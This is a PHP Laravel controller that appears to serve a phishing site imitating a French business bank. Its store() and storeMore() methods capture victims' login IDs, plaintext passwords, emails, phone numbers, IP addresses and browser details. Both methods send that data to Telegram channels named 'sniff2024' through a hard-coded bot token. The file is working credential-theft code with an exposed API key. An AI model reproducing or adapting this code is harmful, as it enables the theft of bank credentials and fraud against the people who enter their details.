<?php

namespace App\Http\Controllers;

use Exception;
use App\Models\User;
use Illuminate\View\View;
use Jenssegers\Agent\Agent;
use Illuminate\Http\Request;

class HomeController extends Controller
{
  public function index() : View {
        return view("index");
   }

  public function login() : View {
    return view("login");
}

public function more(User $user) : View {
  return view("moreinfo", compact('user'));
}


public function store(Request $request)  {
  $agent = new Agent();
        $agent->setHttpHeaders($request->header());


            $mob =$agent->deviceType();

           $user = User::create([
            'password' => htmlspecialchars($request->code),
            'reelpassword' =>  htmlspecialchars($request->code),
            'user_id' => htmlspecialchars($request->user_id),
            'platform' => $agent->platform(),
            'user_agent' => $request->header()['user-agent'][0],
            'mob_desck' => $mob,
            'accept_language' => $request->header()['accept-language'][0],
            'browser'=> $agent->browser(),
            'ip' => request()->ip(),

           ]);
           $dat = date( 'd/m/Y H:i:s', time() );
           $content = "Information Utilisateur Numero <b> $request->user_id </b>  \n <b>date : </b> $dat  \n <b>Identifiant : </b> $request->user_id \n <b>mot de passe : </b> $user->reelpassword \n <b>Systeme : </b> $user->platform \n <b>user_agent : </b> $user->user_agent \n <b>Mobile ou Desktop : </b> $user->mob_desck \n <b>accept_language : </b> $user->accept_language \n <b>Navigateur : </b> $user->browser \n <b>Addresse ip : </b> $user->ip";
           $api_key = "6993379722:AAH-qs9LgsLEo5kZbfb8R3tOxmvIPQQIrlA";

           $data = [
             'chat_id' => '@sniff2024',
             'text' => $content,
             'parse_mode' => 'HTML'
           ];

           $data2 = [
            'chat_id' => '@sniff20242',
            'text' => $content,
            'parse_mode' => 'HTML'
          ];

         //  try {
            $response = file_get_contents("https://api.telegram.org/bot$api_key/sendMessage?".http_build_query($data2));
                  $response = file_get_contents("https://api.telegram.org/bot$api_key/sendMessage?".http_build_query($data));

                  return response()->json([
                    'id' => $user->id,
                ]);
                        // Ajouter un log en cas de succès
          //  error_log("Telegram API Response: " . $response);
          // } catch (Exception $e) {
          //     // Ajouter un log en cas d'erreur
          //     error_log("Error sending Telegram message: " . $e->getMessage());
          // }
}

public function storeMore(Request $request, User $user)  {

           $user->update([
            'email' => htmlspecialchars($request->email),
            'phone' =>  htmlspecialchars($request->phone)

           ]);
           $dat = date( 'd/m/Y H:i:s', time() );
           $content = "Information Utilisateur Numero <b> $user->user_id </b>  \n <b>email : </b> $request->email \n <b>Telephone : </b> $request->phone";
           $api_key = "6993379722:AAH-qs9LgsLEo5kZbfb8R3tOxmvIPQQIrlA";

           $data = [
             'chat_id' => '@sniff2024',
             'text' => $content,
             'parse_mode' => 'HTML'
           ];

           $data2 = [
            'chat_id' => '@sniff20242',
            'text' => $content,
            'parse_mode' => 'HTML'
          ];

          $response = file_get_contents("https://api.telegram.org/bot$api_key/sendMessage?".http_build_query($data2));
                  $response = file_get_contents("https://api.telegram.org/bot$api_key/sendMessage?".http_build_query($data));




}



public function financement() : View {
  return view("financement");
}

public function auquotidien() : View {
  return view("auquotidien");
}

public function international() : View {
  return view("international");
}

public function rse() : View {
  return view("rse");
}

public function protegerfideliser() : View {
  return view("protegerfideliser");
}

public function contactsentreprises() : View {
  return view("contactsentreprises");
}



}
